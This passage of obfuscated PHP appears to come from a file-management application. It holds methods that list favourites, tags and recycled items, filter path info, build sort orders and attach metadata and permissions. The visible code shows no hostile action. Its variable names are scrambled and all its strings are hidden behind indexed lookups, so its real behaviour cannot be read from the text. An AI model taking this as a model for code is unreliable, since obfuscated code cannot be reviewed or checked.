$ş—¯­Áï = false) { $Ú‹ËÀÀ =& $_SERVER[Î·Ü›öğ]; $‰û£µû» = $‰û£µû» ? $‰û£µû» : array(); $‰û£µû» = array_filter(array_unique($‰û£µû»)); if (!$‰û£µû») { return array(); } $´­…¤é™ = $this->where(array($Ú‹ËÀÀ[194] => array($Ú‹ËÀÀ[7], $‰û£µû»)))->select(); $this->_listDataApply($´­…¤é™, $ş—¯­Áï); return array_to_keyvalue($´­…¤é™, $Ú‹ËÀÀ[194]); } public function pathInfoFilter(&$ï–ÑøÕ¾) { $¹«Û» =& $_SERVER[Î·Ü›öğ]; static $°·¶“ı = false; static $­½‹­Ÿ’ = false; static $æº‰‡ = false; if (!$°·¶“ı) { $±ıâ“š° = $¹«Û»[489]; $±ıâ“š° .= $¹«Û»[490]; $±ıâ“š° .= $¹«Û»[491]; $«²Ú› = $¹«Û»[492]; $¿Œ¬ŞÈ’ = explode($¹«Û»[50], $«²Ú›); $°·¶“ı = explode($¹«Û»[50], $±ıâ“š°); $­½‹­Ÿ’ = array(); foreach ($°·¶“ı as $¸ï¬¤ü¡) { if (in_array($¸ï¬¤ü¡, $¿Œ¬ŞÈ’)) { continue; } $­½‹­Ÿ’[] = $¸ï¬¤ü¡; } $æº‰‡ = explode($¹«Û»[50], $¹«Û»[493]); } foreach ($æº‰‡ as $İ˜ÆŠ—û) { if (isset($ï–ÑøÕ¾[$İ˜ÆŠ—û])) { $ï–ÑøÕ¾[$İ˜ÆŠ—û] = intval($ï–ÑøÕ¾[$İ˜ÆŠ—û]); } } $ï–ÑøÕ¾[$¹«Û»[87]] = $¹«Û»[494] . $ï–ÑøÕ¾[$¹«Û»[194]] . $¹«Û»[495]; $ï–ÑøÕ¾[$¹«Û»[33]] = $ï–ÑøÕ¾[$¹«Û»[496]] == 1 ? $¹«Û»[78] : $¹«Û»[233]; $ï–ÑøÕ¾[$¹«Û»[191]] = $this->typeName($ï–ÑøÕ¾[$¹«Û»[191]]); if ($ï–ÑøÕ¾[$¹«Û»[496]] != 1) { $ï–ÑøÕ¾[$¹«Û»[169]] = $ï–ÑøÕ¾[$¹«Û»[497]]; unset($ï–ÑøÕ¾[$¹«Û»[497]]); } $Œ¨¦ã€¦ = $°·¶“ı; if (isset($ï–ÑøÕ¾[$¹«Û»[498]]) && $ï–ÑøÕ¾[$¹«Û»[498]][$¹«Û»[499]] == -1) { $Œ¨¦ã€¦ = $­½‹­Ÿ’; } $ï–ÑøÕ¾ = array_field_key($ï–ÑøÕ¾, $Œ¨¦ã€¦); return $ï–ÑøÕ¾; } public function listUserFav() { $ÔìıØ–Í =& $_SERVER[Î·Ü›öğ]; $°›¥À¿´ = Model($ÔìıØ–Í[500])->listData(); $Óîò¦ôŒ = array_filter_by_field($°›¥À¿´, $ÔìıØ–Í[33], $ÔìıØ–Í[501]); $Óîò¦ôŒ = array_to_keyvalue($Óîò¦ôŒ, $ÔìıØ–Í[12], $ÔìıØ–Í[87]); if ($Óîò¦ôŒ) { $ò™½Ğ¡ö = $this->listSource(array($ÔìıØ–Í[502] => array($ÔìıØ–Í[503], $Óîò¦ôŒ))); } $ò™½Ğ¡ö = array_to_keyvalue($ò™½Ğ¡ö[$ÔìıØ–Í[447]], $ÔìıØ–Í[194]); foreach ($°›¥À¿´ as &$Ï§Ì­ Ö) { $Ï§Ì­ Ö = array($ÔìıØ–Í[504] => $Ï§Ì­ Ö[$ÔìıØ–Í[477]], $ÔìıØ–Í[505] => $Ï§Ì­ Ö[$ÔìıØ–Í[32]], $ÔìıØ–Í[506] => $Ï§Ì­ Ö[$ÔìıØ–Í[87]], $ÔìıØ–Í[507] => $Ï§Ì­ Ö[$ÔìıØ–Í[33]], $ÔìıØ–Í[508] => $Ï§Ì­ Ö[$ÔìıØ–Í[234]], $ÔìıØ–Í[509] => $Ï§Ì­ Ö[$ÔìıØ–Í[88]]); if ($Ï§Ì­ Ö[$ÔìıØ–Í[33]] == $ÔìıØ–Í[501] && $ò™½Ğ¡ö[$Ï§Ì­ Ö[$ÔìıØ–Í[87]]]) { $Ï§Ì­ Ö[$ÔìıØ–Í[90]] = $ò™½Ğ¡ö[$Ï§Ì­ Ö[$ÔìıØ–Í[87]]]; } } unset($Ï§Ì­ Ö); return $°›¥À¿´; } public function listUserTag($’óıÑ™) { $ÍÏ¥Û¨‹ =& $_SERVER[Î·Ü›öğ]; if ($’óıÑ™ && !is_array($’óıÑ™)) { $’óıÑ™ = array($’óıÑ™); } $¢ï¨ÇÓ = Model($ÍÏ¥Û¨‹[510])->listData(); $«ÇÃÔ¡™ = array(); $Ï¡ì…â‹ = array(); foreach ($¢ï¨ÇÓ as $‡©Ï›Â) { $ø¥Û‰ä… = $‡©Ï›Â[$ÍÏ¥Û¨‹[87]]; if (!$ø¥Û‰ä…) { continue; } if (!isset($Ï¡ì…â‹[$ø¥Û‰ä…])) { $Ï¡ì…â‹[$ø¥Û‰ä…] = array(); } $Ï¡ì…â‹[$ø¥Û‰ä…][] = $‡©Ï›Â[$ÍÏ¥Û¨‹[511]]; $«ÇÃÔ¡™[$‡©Ï›Â[$ÍÏ¥Û¨‹[87]]] = $‡©Ï›Â; } $•êˆöÓ› = array(); $¹Ò—­·Á = array(); $Õ´±£ÜÅ = array(); foreach ($Ï¡ì…â‹ as $ª•“¦Õ‚ => $ºÄÚ¼­Ø) { $óöç£î = !0; if (!$’óıÑ™) { $•êˆöÓ›[] = $ª•“¦Õ‚; continue; } foreach ($’óıÑ™ as $‚ÜØ‹¹´) { if (!in_array($‚ÜØ‹¹´, $ºÄÚ¼­Ø)) { $óöç£î = !1; break; } } if (!$óöç£î) { continue; } if (!is_numeric($ª•“¦Õ‚)) { $ÊºÌÂ™í = $«ÇÃÔ¡™[$ª•“¦Õ‚]; $¸¢¢èî» = array($ÍÏ¥Û¨‹[32] => $ÊºÌÂ™í[$ÍÏ¥Û¨‹[32]], $ÍÏ¥Û¨‹[87] => $ÊºÌÂ™í[$ÍÏ¥Û¨‹[87]], $ÍÏ¥Û¨‹[33] => $ÊºÌÂ™í[$ÍÏ¥Û¨‹[33]], $ÍÏ¥Û¨‹[90] => array($ÍÏ¥Û¨‹[512] => 1), $ÍÏ¥Û¨‹[235] => !0); if ($ÊºÌÂ™í[$ÍÏ¥Û¨‹[33]] == $ÍÏ¥Û¨‹[233]) { $Õ´±£ÜÅ[] = $¸¢¢èî»; } if ($ÊºÌÂ™í[$ÍÏ¥Û¨‹[33]] == $ÍÏ¥Û¨‹[78]) { $¹Ò—­·Á[] = $¸¢¢èî»; } continue; } $•êˆöÓ›[] = $ª•“¦Õ‚; } if ($•êˆöÓ›) { $âËâÒæÖ = $this->listSource(array($ÍÏ¥Û¨‹[502] => array($ÍÏ¥Û¨‹[503], $•êˆöÓ›))); } $âËâÒæÖ = $âËâÒæÖ ? $âËâÒæÖ : array($ÍÏ¥Û¨‹[85] => array(), $ÍÏ¥Û¨‹[86] => array()); $âËâÒæÖ[$ÍÏ¥Û¨‹[85]] = array_merge($âËâÒæÖ[$ÍÏ¥Û¨‹[85]], $¹Ò—­·Á); $âËâÒæÖ[$ÍÏ¥Û¨‹[86]] = array_merge($âËâÒæÖ[$ÍÏ¥Û¨‹[86]], $Õ´±£ÜÅ); if (isset($âËâÒæÖ[$ÍÏ¥Û¨‹[444]]) && count($•êˆöÓ›) == $âËâÒæÖ[$ÍÏ¥Û¨‹[444]][$ÍÏ¥Û¨‹[445]]) { return $âËâÒæÖ; } $Ô……¢ĞÆ = array(); $³ûã·— = array_to_keyvalue($âËâÒæÖ[$ÍÏ¥Û¨‹[85]], $ÍÏ¥Û¨‹[12], $ÍÏ¥Û¨‹[194]); $’ˆ¡…”± = array_to_keyvalue($âËâÒæÖ[$ÍÏ¥Û¨‹[86]], $ÍÏ¥Û¨‹[12], $ÍÏ¥Û¨‹[194]); $™ëïş¸˜ = array_merge($’ˆ¡…”±, $³ûã·—); foreach ($•êˆöÓ› as $ø¥Û‰ä…) { if (!in_array($ø¥Û‰ä…, $™ëïş¸˜)) { $Ô……¢ĞÆ[] = $ø¥Û‰ä…; } } if ($Ô……¢ĞÆ) { Model($ÍÏ¥Û¨‹[513])->removeBySource($Ô……¢ĞÆ); } return $âËâÒæÖ; } public function listUserRecycle() { $”—÷°æŒ =& $_SERVER[Î·Ü›öğ]; $¥ºœÑùß = Model($”—÷°æŒ[514])->listData(); if (!$¥ºœÑùß) { return array(); } $Á¤å³Œœ = array($”—÷°æŒ[502] => array($”—÷°æŒ[503], $¥ºœÑùß), $”—÷°æŒ[515] => 1); return $this->listSource($Á¤å³Œœ); } public function listSource($Ğ½§úŸÎ, $€¦¤À¾ú = 3000, $ÒÜıçöî = false) { $¿å¹°ğ£ =& $_SERVER[Î·Ü›öğ]; if (!isset($Ğ½§úŸÎ[$¿å¹°ğ£[516]])) { $Ğ½§úŸÎ[$¿å¹°ğ£[516]] = 0; } if (isset($Ğ½§úŸÎ[$¿å¹°ğ£[193]]) && $Ğ½§úŸÎ[$¿å¹°ğ£[193]] == $¿å¹°ğ£[231]) { $Ğ½§úŸÎ[$¿å¹°ğ£[497]] = array($¿å¹°ğ£[517], $¿å¹°ğ£[12]); } if (isset($Ğ½§úŸÎ[$¿å¹°ğ£[193]])) { $Ğ½§úŸÎ[$¿å¹°ğ£[193]] = intval($Ğ½§úŸÎ[$¿å¹°ğ£[193]]); } $õ¼àíéœ = $¿å¹°ğ£[518]; $Ò“Üí£ü = $this->field($õ¼àíéœ)->_makeOrder()->where($Ğ½§úŸÎ)->selectPage($€¦¤À¾ú); $this->_listPageCheck($Ò“Üí£ü, $õ¼àíéœ, $Ğ½§úŸÎ); $this->_listDataApply($Ò“Üí£ü[$¿å¹°ğ£[447]], $ÒÜıçöî); $this->_listMake($Ò“Üí£ü); return $Ò“Üí£ü; } private function _listPageCheck(&$Æ”£˜·, $û›’‡×¡, $ñş³éÇÅ) { $Ö“öÑµÉ =& $_SERVER[Î·Ü›öğ]; if (!is_array($Æ”£˜·[$Ö“öÑµÉ[444]])) { return; } $ºËÇîü = $Æ”£˜·[$Ö“öÑµÉ[444]]; if ($ºËÇîü[$Ö“öÑµÉ[446]] <= 1) { return; } if ($ºËÇîü[$Ö“öÑµÉ[445]] >= 100000) { return; } if (Model($Ö“öÑµÉ[519])->get($Ö“öÑµÉ[520]) != $Ö“öÑµÉ[521]) { return; } $û›’‡×¡ = str_replace(array($Ö“öÑµÉ[53], $Ö“öÑµÉ[419], $Ö“öÑµÉ[288]), $Ö“öÑµÉ[12], $û›’‡×¡); $û›’‡×¡ = $Ö“öÑµÉ[522] . str_replace($Ö“öÑµÉ[50], $Ö“öÑµÉ[523], $û›’‡×¡) . $Ö“öÑµÉ[524]; $©šÙ’Ë = $Ö“öÑµÉ[525]; $©šÙ’Ë = $©šÙ’Ë . $Ö“öÑµÉ[526]; $ŸíˆĞ“¢ = $ºËÇîü[$Ö“öÑµÉ[441]] * ($ºËÇîü[$Ö“öÑµÉ[430]] - 1) . $Ö“öÑµÉ[50] . $ºËÇîü[$Ö“öÑµÉ[441]]; $É¹ù–ÀÅ = $this->_makeOrder(!0); $ Ú´ö™ = $Ö“öÑµÉ[522] . str_replace($Ö“öÑµÉ[50], $Ö“öÑµÉ[523], $É¹ù–ÀÅ[0]); if (strpos($ Ú´ö™, $Ö“öÑµÉ[527])) { $ Ú´ö™ = str_replace($Ö“öÑµÉ[527], $Ö“öÑµÉ[528], $ Ú´ö™); } else { $ Ú´ö™ .= $Ö“öÑµÉ[529] . $É¹ù–ÀÅ[1]; } $¨ÜÁ¤Úä = array(); foreach ($ñş³éÇÅ as $Œ‹âÅÊ¼ => $éá£˜¡•) { $¨ÜÁ¤Úä[$Ö“öÑµÉ[522] . $Œ‹âÅÊ¼] = $éá£˜¡•; } $this->alias($Ö“öÑµÉ[530])->field($û›’‡×¡)->limit($ŸíˆĞ“¢)->order($ Ú´ö™); $ĞÇ„ĞòË = $this->join($©šÙ’Ë)->where($¨ÜÁ¤Úä)->select(); if ($ĞÇ„ĞòË) { $Æ”£˜·[$Ö“öÑµÉ[447]] = $ĞÇ„ĞòË; } } protected function _makeOrder($½Ù°ñì = false) { $Ê™üòÊ =& $_SERVER[Î·Ü›öğ]; $º§íøş = Model($Ê™üòÊ[531])->get($Ê™üòÊ[532]); $¾Ş¬É¿Ô = Model($Ê™üòÊ[531])->get($Ê™üòÊ[533]); $Ã¸×Ùîë = array($Ê™üòÊ[534] => $Ê™üòÊ[535], $Ê™üòÊ[536] => $Ê™üòÊ[537]); $ßÉ˜Œ“ã = array($Ê™üòÊ[32] => $Ê™üòÊ[32], $Ê™üòÊ[79] => $Ê™üòÊ[79], $Ê™üòÊ[169] => $Ê™üòÊ[497], $Ê™üòÊ[538] => $Ê™üòÊ[538], $Ê™üòÊ[539] => $Ê™üòÊ[540], $Ê™üòÊ[234] => $Ê™üòÊ[234], $Ê™üòÊ[88] => $Ê™üòÊ[88]); $ïºÚ„Šğ = Input::get($Ê™üòÊ[541], $Ê™üòÊ[7], $º§íøş, array_keys($ßÉ˜Œ“ã)); $…Şù­ïö = Input::get($Ê™üòÊ[542], $Ê™üòÊ[7], $¾Ş¬É¿Ô, array_keys($Ã¸×Ùîë)); if (!in_array($ïºÚ„Šğ, array_keys($ßÉ˜Œ“ã))) { $ïºÚ„Šğ = $Ê™üòÊ[32]; } if (!in_array($…Şù­ïö, array_keys($Ã¸×Ùîë))) { $ïºÚ„Šğ = $Ê™üòÊ[534]; } if ($ïºÚ„Šğ == $Ê™üòÊ[32]) { } $ÔÓ¤ë¾ğ = $Ê™üòÊ[543] . $ßÉ˜Œ“ã[$ïºÚ„Šğ] . $Ê™üòÊ[53] . $Ã¸×Ùîë[$…Şù­ïö]; $ÔÓ¤ë¾ğ = rtrim(trim($ÔÓ¤ë¾ğ), $Ê™üòÊ[50]); if ($½Ù°ñì) { return array($ÔÓ¤ë¾ğ, $Ã¸×Ùîë[$…Şù­ïö]); } return $this->order($ÔÓ¤ë¾ğ); } protected function _listDataApplyItem($½ÚøĞå€, $¦ŸĞ‡Î = false) { $àò‰ÃªÕ = array($½ÚøĞå€); $this->_listDataApply($àò‰ÃªÕ, $¦ŸĞ‡Î); return $àò‰ÃªÕ[0]; } protected function _listDataApply(&$´ú“¯î, $Ë†ßş™ƒ = false) { $œõÄÚß‰ =& $_SERVER[Î·Ü›öğ]; if (!$´ú“¯î) { $´ú“¯î = array(); return; } $Èˆ¯¦ÀÇ = array_to_keyvalue($´ú“¯î, $œõÄÚß‰[12], $œõÄÚß‰[194]); $Èˆ¯¦ÀÇ = array_unique($Èˆ¯¦ÀÇ); $Èˆ¯¦ÀÇ = array_to_int($Èˆ¯¦ÀÇ); $this->_listSourceCache($´ú“¯î); if (!$Ë†ßş™ƒ) { $this->_listAppendMeta($´ú“¯î, $Èˆ¯¦ÀÇ); $this->_listAppendFileMeta($´ú“¯î, $Èˆ¯¦ÀÇ); $this->_listAppendChildren($´ú“¯î, $Èˆ¯¦ÀÇ); } $this->_listAppendPath($´ú“¯î); $this->_listAppendAuth($´ú“¯î); $this->_listAppendSourceInfo($´ú“¯î, $Èˆ¯¦ÀÇ); $this->_listAppendUser($´ú“¯î); $this->_listFilterInfo($´ú“¯î, $Ë†ßş™ƒ); $this->_listAppendAuthSecret($´ú“¯î); } protected function _listSourceCache($ÆŸ´ªÒ¹) { $î‹‹óÇÁ =& $_SERVER[Î·Ü›öğ]; foreach ($ÆŸ´ªÒ¹ as $µş“‘ç) { self::$cacheSourceInfo[$î‹‹óÇÁ[544] . $µş“‘ç[$î‹‹óÇÁ[194]]] = $µş“‘ç; } } protected function _listFilterInfo(&$¦í¾ƒ‡¤, $Ç¿µûóí = false) { $“ºÔğØ =& $_SERVER[Î·Ü›öğ]; foreach ($¦í¾ƒ‡¤ as &$éˆßÓ÷Õ) { $éˆßÓ÷Õ = $this->pathInfoFilter($éˆßÓ÷Õ); self::$cachePathInfo[$“ºÔğØ[545] . intval($Ç¿µûóí) . $“ºÔğØ[464] . $éˆßÓ÷Õ[$“ºÔğØ[194]]] = $éˆßÓ÷Õ; } unset($éˆßÓ÷Õ); } protected function _listMake(&$ç¤÷üŞ) { $¸Åïîí  =& $_SERVER[Î·Ü›öğ]; $ç¤÷üŞ[$¸Åïîí [85]] = array(); $ç¤÷üŞ[$¸Åïîí [86]] = array(); foreach ($ç¤÷üŞ[$¸Åïîí [447]] as $À‹ÍÔö«) { $Ó¼ºÖÃ = $À‹ÍÔö«[$¸Åïîí [496]] == 1 ? $¸Åïîí [85] : $¸Åïîí [86]; $ç¤÷üŞ[$Ó¼ºÖÃ][] = $À‹ÍÔö«; } unset($ç¤÷üŞ[$¸Åïîí [447]]); } protected function _listAppendMeta(&$”Ç¡Ô„¸, $ùİœş¶ò) { $¬á„Á÷¸ =& $_SERVER[Î·Ü›öğ]; $¹Åíé×’ = array($¬á„Á÷¸[502] => array($¬á„Á÷¸[503], $ùİœş¶ò)); $Åáò‰ = Model($¬á„Á÷¸[546])->field($¬á„Á÷¸[547])->where($¹Åíé×’)->select(); if (!$Åáò‰) { return; } $Ş×­ÖÏ = array($¬á„Á÷¸[548], $¬á„Á÷¸[549], $¬á„Á÷¸[528]); $ÊœÕ“ÍÂ = array(); foreach ($Åáò‰ as $ÚÍÈ·Ø¼) { if (!isset($ÊœÕ“ÍÂ[$ÚÍÈ·Ø¼[$¬á„Á÷¸[194]]])) { $ÊœÕ“ÍÂ[$ÚÍÈ·Ø¼[$¬á„Á÷¸[194]]] = array(); } if (in_array($ÚÍÈ·Ø¼[$¬á„Á÷¸[97]], $Ş×­ÖÏ)) { continue; } if ($ÚÍÈ·Ø¼[$¬á„Á÷¸[97]] == $¬á„Á÷¸[550]) { $ÚÍÈ·Ø¼[$¬á„Á÷¸[452]] = $¬á„Á÷¸[551]; } $ÊœÕ“ÍÂ[$ÚÍÈ·Ø¼[$¬á„Á÷¸[194]]][$ÚÍÈ·Ø¼[$¬á„Á÷¸[97]]] = $ÚÍÈ·Ø¼[$¬á„Á÷¸[452]]; } foreach ($”Ç¡Ô„¸ as &$ÂÉ’òˆ”) { $ÂÉ’òˆ”[$¬á„Á÷¸[552]] = !1; if (isset($ÊœÕ“ÍÂ[$ÂÉ’òˆ”[$¬á„Á÷¸[194]]])) { $ÂÉ’òˆ”[$¬á„Á÷¸[552]] = $ÊœÕ“ÍÂ[$ÂÉ’òˆ”[$¬á„Á÷¸[194]]]; } if ($this->fileIsLock($ÂÉ’òˆ”) && $ÂÉ’òˆ”[$¬á„Á÷¸[498]]) { $±ÌÂş€Á = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÂÉ’òˆ”[$¬á„Á÷¸[498]][$¬á„Á÷¸[499]] = AuthModel::authDisable($ÂÉ’òˆ”[$¬á„Á÷¸[498]][$¬á„Á÷¸[499]], $±ÌÂş€Á); $ÂÉ’òˆ”[$¬á„Á÷¸[498]][$¬á„Á÷¸[553]][$¬á„Á÷¸[498]] = $ÂÉ’òˆ”[$¬á„Á÷¸[498]][$¬á„Á÷¸[499]]; } } unset($ÂÉ’òˆ”); } protected function _listAppendFileMeta(&$Ú¢úÔ—, $ãğãâƒ§) { $°’Û«Ù =& $_SERVER[Î·Ü›öğ]; $ŠÖñš¯¡ = array_to_keyvalue($Ú¢úÔ—, $°’Û«Ù[12], $°’Û«Ù[554]); $ŠÖñš¯¡ = array_filter(array_unique($ŠÖñš¯¡)); $ŠÖñš¯¡ = array_to_int($ŠÖñš¯¡); if (!$ŠÖñš¯¡) { return; } $ù±éŒÚ = array($°’Û«Ù[555] => array($°’Û«Ù[503], $ŠÖñš¯¡)); $áŠŞòµ = $°’Û«Ù[556]; $š‡…ö‹ = Model($°’Û«Ù[557])->field($áŠŞòµ)->where($ù±éŒÚ)->select(); $š‡…ö‹ = array_to_keyvalue($š‡…ö‹, $°’Û«Ù[554]); $³şË¿‰ = Model($°’Û«Ù[558])->field($°’Û«Ù[559])->where($ù±éŒÚ)->select(); $³şË¿‰ = $³şË¿‰ ? $³şË¿‰ : array(); $ó›¦ã› = array(); foreach ($³şË¿‰ as $ƒ³ßƒÉ) { if (!isset($ó›¦ã›[$ƒ³ßƒÉ[$°’Û«Ù[554]]])) { $ó›¦ã›[$ƒ³ßƒÉ[$°’Û«Ù[554]]] = array(); } $ó›¦ã›[$ƒ³ßƒÉ[$°’Û«Ù[554]]][$ƒ³ßƒÉ[$°’Û«Ù[97]]] = $ƒ³ßƒÉ[$°’Û«Ù[452]]; } foreach ($Ú¢úÔ— as &$ÚóÌÃï) { $çÛ¶ÛË† = $ÚóÌÃï[$°’Û«Ù[554]]; if (!$çÛ¶ÛË† || !is_array($š‡…ö‹[$çÛ¶ÛË†])) { continue; } $¹ıÈœÜ° = $š‡…ö‹[$çÛ¶ÛË†]; $¹ıÈœÜ°[$°’Û«Ù[79]] = $ÚóÌÃï[$°’Û«Ù[79]]; $¹ıÈœÜ°[$°’Û«Ù[32]] = $ÚóÌÃï[$°’Û«Ù[32]]; if (!$¹ıÈœÜ°[$°’Û«Ù[560]]) { Model($°’Û«Ù[557])->fileMd5Check($¹ıÈœÜ°); } if (!isset(self::$cacheFileInfo[$°’Û«Ù[561] . $çÛ¶ÛË†])) { self::$cacheFileInfo[$°’Û«Ù[561] . $çÛ¶ÛË†] = array_merge(array(), $¹ıÈœÜ°); } unset($š‡…ö‹[$çÛ¶ÛË†][$°’Û«Ù[87]]); $¢Ÿ©ßÔô = isset($ó›¦ã›[$çÛ¶ÛË†]) && is_array($ó›¦ã›[$çÛ¶ÛË†]) ? $ó›¦ã›[$çÛ¶ÛË†] : array(); $ÚóÌÃï[$°’Û«Ù[170]] = array_merge($¢Ÿ©ßÔô, $š‡…ö‹[$çÛ¶ÛË†]); if (isset($ÚóÌÃï[$°’Û«Ù[170]][$°’Û«Ù[185]])) { $ÚóÌÃï[$°’Û«Ù[185]] = json_decode($ÚóÌÃï[$°’Û«Ù[170]][$°’Û«Ù[185]], !0); unset($ÚóÌÃï[$°’Û«Ù[170]][$°’Û«Ù[185]]); } } unset($ÚóÌÃï); } protected function _listAppendSourceInfo(&$æŒ¥¬, $Ü£¢Ë«) { $¢ö©ï¡õ =& $_SERVER[Î·Ü›öğ]; $êà¶åı = Model($¢ö©ï¡õ[562])->listData(); $µñõÀ”È = Model($¢ö©ï¡õ[510])->listData(); $Ô²ö®Ì = Model($¢ö©ï¡õ[500])->listData(); $£”Ÿú¡Î = Model($¢ö©ï¡õ[563])->listSimple(); $ÀĞÊ×îø = array_to_keyvalue($êà¶åı, $¢ö©ï¡õ[477]); $›“™ªÖ = array_to_keyvalue_group($µñõÀ”È, $¢ö©ï¡õ[87], $¢ö©ï¡õ[511]); $®‹ïıÇ« = array_to_keyvalue($Ô²ö®Ì, $¢ö©ï¡õ[87]); $¿Éà”ìó = array_to_keyvalue_group($£”Ÿú¡Î, $¢ö©ï¡õ[194]); foreach ($æŒ¥¬ as &$™ù¿¨) { $™ù¿¨[$¢ö©ï¡õ[90]] = array($¢ö©ï¡õ[564] => 0, $¢ö©ï¡õ[565] => 0, $¢ö©ï¡õ[566] => 0); if (isset($®‹ïıÇ«[$™ù¿¨[$¢ö©ï¡õ[194]]])) { $™ù¿¨[$¢ö©ï¡õ[90]][$¢ö©ï¡õ[567]] = 1; $™ù¿¨[$¢ö©ï¡õ[90]][$¢ö©ï¡õ[568]] = $®‹ïıÇ«[$™ù¿¨[$¢ö©ï¡õ[194]]][$¢ö©ï¡õ[32]]; } if ($›“™ªÖ && $ÀĞÊ×îø && isset($›“™ªÖ[$™ù¿¨[$¢ö©ï¡õ[194]]])) { $™ù¿¨[$¢ö©ï¡õ[90]][$¢ö©ï¡õ[569]] = array(); foreach ($›“™ªÖ[$™ù¿¨[$¢ö©ï¡õ[194]]] as $ìì¸ûÁô) { $“—‚ ÒÄ = $ÀĞÊ×îø[$ìì¸ûÁô]; $™ù¿¨[$¢ö©ï¡õ[90]][$¢ö©ï¡õ[569]][] = array($¢ö©ï¡õ[570] => $“—‚ ÒÄ[$¢ö©ï¡õ[477]], $¢ö©ï¡õ[505] => $“—‚ ÒÄ[$¢ö©ï¡õ[32]], $¢ö©ï¡õ[571] => $“—‚ ÒÄ[$¢ö©ï¡õ[572]]); } } if ($¿Éà”ìó && isset($¿Éà”ìó[$™ù¿¨[$¢ö©ï¡õ[194]]])) { $™ù¿¨[$¢ö©ï¡õ[90]][$¢ö©ï¡õ[573]] = array(); foreach ($¿Éà”ìó[$™ù¿¨[$¢ö©ï¡õ[194]]] as $¯¶ÖÆşã) { $ê¾ˆÁ = $¢ö©ï¡õ[574]; if ($¯¶ÖÆşã[$¢ö©ï¡õ[575]] == $¢ö©ï¡õ[91]) { $ê¾ˆÁ .= $¢ö©ï¡õ[576]; } $™ù¿¨[$¢ö©ï¡õ[90]][$¢ö©ï¡õ[573]] = array_field_key($¯¶ÖÆşã, explode($¢ö©ï¡õ[50], $ê¾ˆÁ)); } } } unset($™ù¿¨); return $æŒ¥¬; } protected function _listAppendChildren(&$ë·ÖªÍò, $üõ‰£øı) { $õ´¶Ø =& $_SERVER[Î·Ü›öğ]; $ä¯æö = array(); $«Å»°€ = array($õ´¶Ø[242] => 0, $õ´¶Ø[243] => 0); foreach ($ë·ÖªÍò as &$‹–»ö”Ü) { if (!$‹–»ö”Ü[$õ´¶Ø[496]]) { continue; } $ä¯æö[] = intval($‹–»ö”Ü[$õ´¶Ø[194]]); } unset($‹–»ö”Ü); if (!$ä¯æö) { return; } $úºæÉÙ– = array($õ´¶Ø[193] => array($õ´¶Ø[7], $ä¯æö), $õ´¶Ø[516] => 0); $Î„ñ¶ª = array($õ´¶Ø[193], $õ´¶Ø[496], $õ´¶Ø[577] => $õ´¶Ø[578]); $„èÖµ… = $this->field($Î„ñ¶ª)->where($úºæÉÙ–)->group($õ´¶Ø[579])->select(); $ô³¥œôÌ = array(); foreach ($„èÖµ… as $âïŞ¯¢†) { $ªüû«Ó = $âïŞ¯¢†[$õ´¶Ø[193]]; $œ’é”• = $âïŞ¯¢†[$õ´¶Ø[496]] == $õ´¶Ø[91] ? $õ´¶Ø[243] : $õ´¶Ø[242]; if (!isset($ô³¥œôÌ[$ªüû«Ó])) { $ô³¥œôÌ[$ªüû«Ó] = array($õ´¶Ø[242] => 0, $õ´¶Ø[243] => 0); } $ô³¥œôÌ[$ªüû«Ó][$œ’é”•] += $âïŞ¯¢†[$õ´¶Ø[578]]; } foreach ($ë·ÖªÍò as &$‹–»ö”Ü) { if (!$‹–»ö”Ü[$õ´¶Ø[496]]) { continue; } $ÀÓ²À×… = is_array($ô³¥œôÌ[$‹–»ö”Ü[$õ´¶Ø[194]]]) ? $ô³¥œôÌ[$‹–»ö”Ü[$õ´¶Ø[194]]] : $«Å»°€; $‹–»ö”Ü[$õ´¶Ø[243]] = $ÀÓ²À×…[$õ´¶Ø[243]]; $‹–»ö”Ü[$õ´¶Ø[242]] = $ÀÓ²À×…[$õ´¶Ø[242]]; unset($‹–»ö”Ü[$õ´¶Ø[497]]); } unset($‹–»ö”Ü); } protected function _listAppendAuth(&$ùˆì®ù) { $ã„âå˜Ş =& $_SERVER[Î·Ü›öğ]; $–úš´ó = array(); foreach ($ùˆì®ù as $’ª¬¢) { if ($’ª¬¢[$ã„âå˜Ş[191]] == self::TYPE_GROUP) { $–úš´ó[] = intval($’ª¬¢[$ã„âå˜Ş[194]]); } } if (!$–úš´ó) { return; } $î¥¢Äöµ = array_to_keyvalue($ùˆì®ù, $ã„âå˜Ş[194]); $ —Ûğá“ = Model($ã„âå˜Ş[580])->getSourceList($–úš´ó, $î¥¢Äöµ); $ ÃĞÁã = KodUser::isRoot(); foreach ($ùˆì®ù as $¼ú‹”† => &$’ª¬¢) { $’ª¬¢[$ã„âå˜Ş[498]] = $ —Ûğá“[$’ª¬¢[$ã„âå˜Ş[194]]]; if (!$’ª¬¢[$ã„âå˜Ş[498]] && $’ª¬¢[$ã„âå˜Ş[191]] == self::TYPE_GROUP) { $’ª¬¢[$ã„âå˜Ş[498]] = Action($ã„âå˜Ş[581])->pathGroupAuthMake($’ª¬¢[$ã„âå˜Ş[582]]); if (!$’ª¬¢[$ã„âå˜Ş[498]] && !$ ÃĞÁã) { $’ª¬¢[$ã„âå˜Ş[236]] = !1; $’ª¬¢[$ã„âå˜Ş[235]] = !1; } } if ($’ª¬¢[$ã„âå˜Ş[498]]) { $’ª¬¢[$ã„âå˜Ş[236]] = AuthModel::authCheckEdit($’ª¬¢[$ã„âå˜Ş[498]][$ã„âå˜Ş[499]]); $’ª¬¢[$ã„âå˜Ş[235]] = AuthModel::authCheckView($’ª¬¢[$ã„âå˜Ş[498]][$ã„âå˜Ş[499]]); } $this->groupPathDisplay($’ª¬¢); } unset($’ª¬¢); } public function _listAppendAuthSecret(&$Š³šÊ¥¡) { $ƒ®Õø³ =& $_SERVER[Î·Ü›öğ]; if (Model($ƒ®Õø³[519])->get($ƒ®Õø³[583]) != $ƒ®Õø³[91]) { return; } static $ë§¯ó²¨ = false; if (!$ë§¯ó²¨) { $ğËß¤ê¸ = Model($ƒ®Õø³[584]); $ØŠÅû— = Model($ƒ®Õø³[585]); $ë§¯ó²¨ = $ØŠÅû—->listData(); $ë§¯ó²¨ = array_to_keyvalue($ë§¯ó²¨, $ƒ®Õø³[194]); $œÇ¼ï¥× = json_decode(Model($ƒ®Õø³[519])->get($ƒ®Õø³[586]), !0); $œÇ¼ï¥× = array_to_keyvalue($œÇ¼ï¥×, $ƒ®Õø³[477]); foreach ($ë§¯ó²¨ as $ˆÔâÊ•ş => $¨’â‹üÙ) { $ÒÎÚ–íé = 